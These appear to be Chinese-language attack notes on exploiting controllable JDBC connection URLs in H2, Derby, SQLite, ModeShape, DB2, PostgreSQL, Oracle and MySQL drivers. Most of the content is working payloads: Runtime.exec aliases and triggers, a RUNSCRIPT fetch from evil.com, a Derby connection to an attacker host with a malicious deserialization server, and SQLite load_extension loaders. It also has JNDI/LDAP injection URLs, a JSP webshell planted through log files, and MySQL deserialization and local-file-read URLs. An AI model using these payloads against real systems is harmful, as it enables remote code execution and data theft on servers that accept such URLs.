
```java
Class.forName(" com.mysql.cj.jdbc.Driver");
String url = "jdbc:mysql://localhost:3306/hitb"
Connection conn = DriverManager.getConnection(url)
```

> JDBC可控的url-> JDBC Driver向建立连接-> 执行payload 攻击JDBC driver


## H2 Database

H2支持命令查询处理复杂数据集 下面两个可以让用户自定义函数

- CREATE ALIAS

格式:

`CREATE ALIAS RUNCMD AS $$<JAVA METHOD>$$;`
`CALL RUNCMD(command)`

JAVA METHOD支持Java源代码, JS代码 Groovy代码


```java
CREATE ALIAS eval AS $$void eval(String s) throws Exception {
java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT eval('cmd /c calc');
```

- CREATE TRIGGER

H2支持使用jdk8内置JavascriptEngine编译执行代码 标志就是`//javascript` 

> `//javascript`后需要紧跟换行符


```JS
CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    var is = java.lang.Runtime.getRuntime().exec("cmd /c calc").getInputStream()
    var scanner = new java.util.Scanner(is).useDelimiter("\\A")
    throw new java.lang.Exception(scanner.next())
$$;
```

### CVE-2018-10054: H2 Database Web Console认证远程代码执行漏洞

`在1.4.198`之前的H2Database版本中 可以通过创建新的数据库文件或连接到内存数据库来访问`/h2-console`页面执行命令

可直接在run界面执行SQL查询 也可执行H2命令`CREATE ALIAS`执行任意代码

### CVE-2021-42392: H2 Database Web 控制台未授权JNDI注入RCE漏洞

`1.4.198`版本的H2控制台新增了`-ifNotExists`选项 默认禁用远程数据库创建 在无具体数据库信息的情况之下无法进入后台

H2控制台依然支持JNDI注入:

- settiing=Generic JNDI Data Source
- Driver Class= javax.naming.InitialContext
- JDBC URL=ldap://xxx/xx

### CVE-2022-23221: H2 Database Web Console未授权JDBC攻击导致远程代码执行

尽管在1.4.198版本中不允许创建新数据库 但可以通过可控的`JDBC URL` 进行JDBC注入攻击

H2的URL标准格式通常为：`jdbc:h2:[file:|mem:|tcp:]<databaseName>;<key1>=<value1>;<key2>=<value2>...`

`org.h2.Driver`支持`INIT`参数 来执行初始化SQL:

`jdbc:h2:mem:test;MODE=MSSQLServer;INIT=RUNSCRIPT FROM 'http://evil.com/setup.sql'`

在无法访问外网的情况 如果环境存在Groovy依赖 可通过编译Groovy语句时执行Java代码:

```java
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS shell2 AS$$@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("cmd.exe /c calc.exe")
})
def x$$
```

H2的CREATE TRIGGER命令中 支持编译执行JS代码:

```JS
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    java.lang.Runtime.getRuntime().exec('cmd /c calc.exe')
$$
```

## Derby内嵌数据库 

### sql RCE

引入Jar:

`CALL SQLJ.INSTALL_JAR('http://url/cp.jar', 'Class.Name', 0)`

`CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','Class.Name')`

创建执行函数:

`CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'class.method'`

`CALL SALES.TOTAL_REVENUES()`

### 反序列化点

从`Derby 10.4`版本开始 官方引入了内置的复制功能 有角色:Master和Slave

Master角色数据库需要以`startMaster=true`模式启动:

- 声明以Master启动:`jdbc:derby:myDB;startMaster=true;...`
- 指定从节点IP:`slaveHost=192.168.1.100`
- 指定从节点端口:`slavePort=1527`

Master 节点与 Slave 节点之间的通信协议存在反序列化点:


```java
Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=evil_server_ip");
```

监听Socket并响应yso payload:

```java
int port = 4851;
ServerSocket server = new ServerSocket(port);
Socket socket = server.accept();
socket.getOutputStream().write(Serializer.serialize(
new CC1().getObject("cmd /c calc.exe")));
socket.getOutputStream().flush();
Thread.sleep(TimeUnit.SECONDS.toMillis(5));
socket.close();
server.close();
```


## SQLite

SQLite是一个嵌入式的关系型数据库引擎 引擎运行在JVM进程中 数据存储在单一`.db`磁盘文件中

Sqlite驱动支持resource参数 引入外部DB到本地:`jdbc:sqlite::resource:http://127.0.0.1/poc.db`

会将外部DB重命名后 本地存储路径系统temp临时目录 命令前缀`sqlite-jdbc-tmp-` + `url.hashCode()`

在CVE-2023-32697漏洞后 修改为前缀`sqlite-jdbc-tmp-` + `随机UUID` 不可预测

> 在JDBC URL可控 sqlite db内容可控 如何进一步利用?

利用`CREATE VIEW` 控制select语句 通过`SELECT load_extension('/tmp/test.so')`加载dll/so 命令执行

一般情况下 load_extension 默认off



通过resource上传poc.db:包含view语句 创建security试图:

`CREATE VIEW security as SELECT ( SELECT load_extension('/tmp/test.so'));`

> 拓展库:`Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts')`

后面通过查询触发view命令执行或Magellan拒绝服务攻击

```java
Class.forName("org.sqlite.JDBC");
Connection connection = DriverManager.getConnection("jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db");

connection.setAutoCommit(true);
Statement statement = connection.createStatement();
statement.execute("SELECT * FROM security");

statement.close();
```

```java
Class.forName("org.sqlite.JDBC");
String url1 = "http://127.0.0.1:81/default.db";
String url2 = "http://127.0.0.1:81/1.dll";
String tmp = "C:\\Users\\administrator\\AppData\\Local\\Temp\\sqlite-jdbc-tmp-";
String db = tmp + new URL(url1).hashCode() + ".db";
String dll = tmp + new URL(url2).hashCode() + ".db";
new File(db).delete();
new File(dll).delete();
DriverManager.getConnection("jdbc:sqlite::resource:"+url1).close();
DriverManager.getConnection("jdbc:sqlite::resource:"+url2).close();
Connection conn = DriverManager.getConnection("jdbc:sqlite:file:"+db+"?enable_load_extension=true");
Statement stmt = conn.createStatement();
String sql = "select load_extension('"+dll+"','dllmain')";
stmt.execute(sql);
```




## ModeShape 

JCR标准(Java Content Repository) 支持结构化和非结构化数据的存储、检索、版本控制、观察、访问控制

- Node（节点）：内容的基本单元 类似于文件系统中的文件夹或文件 可以包含子节点和属性

- Property（属性）：节点的属性 存储具体数据 有名称和值

ModeShape实现JCR2.0标准的开源内容仓库 且实现了JDBC标准接口 可以通过传统JDBC方式访问ModeShape库

```java
//初始化引擎
ModeShapeEngine engine = new ModeShapeEngine();
engine.start();
//使用默认配置创建一个名为 "TestRepo" 的内存仓库
RepositoryConfiguration config = RepositoryConfiguration.read("{'name':'TestRepo'}");
engine.deploy(config);

// 注册驱动
Class.forName("org.modeshape.jdbc.LocalJcrDriver");
Connection jdbcConn = DriverManager.getConnection("jdbc:jcr:local:TestRepo", new Properties());

//创建 Statement 并执行查询 使用 JCR-SQL2 语法
Statement stmt = jdbcConn.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

ModeShape驱动也支持`jdbc:jcr:jndi:`方式:

```java
//绑定
Context ctx = new InitialContext();
ctx.rebind("MyJndiRepo", repository);
// 注册驱动
Class.forName("org.modeshape.jdbc.LocalJcrDriver");
Connection jdbcConn = DriverManager.getConnection("jdbc:jcr:jndi:MyJndiRepo", new Properties());

```

导致jndi注入:

`jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass`

## IBM DB2

driver:`com.ibm.db2.jcc.DB2Driver`

`jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evil`

## PostgreSQL 

 CVE-2022-21724 如下参数会造成class实例化:
 - authenticationPluginClassName
 - sslhostnameverifier
 - socketFactory
 - sslfactory
 - sslpasswordcallback

`jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml`

`cls.getConstructor(String.class);` 需要socketFactory类有单String的构造方法 才可以实例化

> 可以用`FileOutputStream(String name)`生成空白文件来验证

### `ClassPathXmlApplicationContext(String configLocation)` 

控制configLocation远程xml 达到SSRF/XXE效果

在xml中可构造bean触发解析SPEL表达式:

### log文件写入


`jdbc:postgresql://<%Runtime.getRuntime().exec(request.getParameter("i"));%>:52791/test?loggerLevel=TRACE&loggerFile=shell.jsp`

## Oracle

泄露user SSRF

`jdbc:oracle:thin:@//127.0.0.1:1521/orcl\r\ninfo\r\nquit\r\n%20`

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                        http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="world" class="java.lang.String">
        <constructor-arg value="#{T (java.lang.Runtime).getRuntime().exec('calc')}"/>
    </bean>
</beans>
```

## MySQL Connector/J 反序列化漏洞

漏洞发生在连接建立阶段 核心在于MySQL JDBC驱动对连接URL中参数解析的逻辑缺陷

驱动在连接初始化阶段会触发查询`SHOW SESSION STATUS` `SHOW COLLATION`

fake服务器对这些内部查询返回恶意的序列化BLOB数据 触发驱动内部的解析逻辑

### fake server

python3:`https://github.com/fnmsd/MySQL_Fake_Server`

java:`https://github.com/4ra1n/mysql-fake-server`

### 常用参数

- `autoDeserialize=true` 
    - 结果集列的类型是`BLOB`且内容以Java序列化魔数`AC ED 00 05`开头 
    - 调用`getObject()`时会自动进行反序列化
- `statementInterceptors`
    - 指定实现`com.mysql.jdbc.StatementInterceptor`接口的class
    - 在8.0中被`queryInterceptors`参数替代

- `detectCustomCollations`
    - 驱动程序会在每次建立连接时从服务器获取实际的字符集

### ServerStatusDiffInterceptor触发
8.x: `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`

6.x(属性名不同): `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`

5.1.11及以上的5.x版本: `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`

5.1.10及以下的5.1.X版本： 同上 但是需要连接后执行查询。

5.0.x: 还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏

### detectCustomCollations触发：

5.1.41及以上: 不可用

5.1.29-5.1.40: `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true`

5.1.28-5.1.19： `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true`

5.1.18以下的5.1.x版本： 不可用

5.0.x版本不可用



### 文件读取

`jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&maxAllowedPacket=655360&user=linux_passwd`
